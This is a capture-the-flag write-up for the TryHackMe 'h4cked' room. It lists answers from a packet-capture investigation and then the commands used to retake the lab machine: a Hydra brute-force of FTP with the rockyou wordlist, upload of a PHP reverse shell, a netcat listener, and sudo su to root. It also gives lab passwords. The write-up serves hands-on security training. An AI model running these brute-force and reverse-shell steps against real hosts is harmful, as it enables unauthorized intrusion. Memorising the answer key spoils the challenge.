# [Challenge](https://tryhackme.com/room/h4cked)
# Oh no! We've been hacked!
## 1. The attacker is trying to log into a specific service. What service is this?
Answer: FTP
## 2. There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
Answer: Hydra
## 3. The attacker is trying to log on with a specific username. What is the username?
Answer: jenny
## 4. What is the user's password?
Answer: password123 (P.S.: follow the tcp stream)
## 5. What is the current FTP working directory after the attacker logged in?
Answer: /var/www/html
## 6. The attacker uploaded a backdoor. What is the backdoor's filename?
Anwer: shell.php
## 7. The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
Answer: http://pentestmonkey.net/tools/php-reverse-shell (P.S.: FTP-DATA)
## 8. Which command did the attacker manually execute after getting a reverse shell?
Answer: whoami
## 9. What is the computer's hostname?
Answer: wir3
## 10. Which command did the attacker execute to spawn a new TTY shell?
Answer: python3 -c 'import pty; pty.spawn("/bin/bash")'
## 11. Which command was executed to gain a root shell?
Answer: sudo su
## 12. The attacker downloaded something from GitHub. What is the name of the GitHub project?
Answer: Reptile
## 13. The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
Answer: Rootkit
# Hack your way back into the machine
## 1. Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.
`hydra -l jenny -P /usr/share/wordlists/rockyou.txt h4cked.thm ftp -t 60 -V`
`[21][ftp] host: h4cked.thm   login: jenny   password: 987654321`
## 2. Change the necessary values inside the web shell and upload it to the webserver & 3. Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.
`put shell.php`
`nc -lvnp 4444`
http://h4cked.thm/shell.php
## 4. Become root!
`su jenny`
`sudo su`
# P.S.: I found another way to gain root (faster)
SSH password for jenny user is the same (`987654321`), so the reverse shell thing isn't necessary.
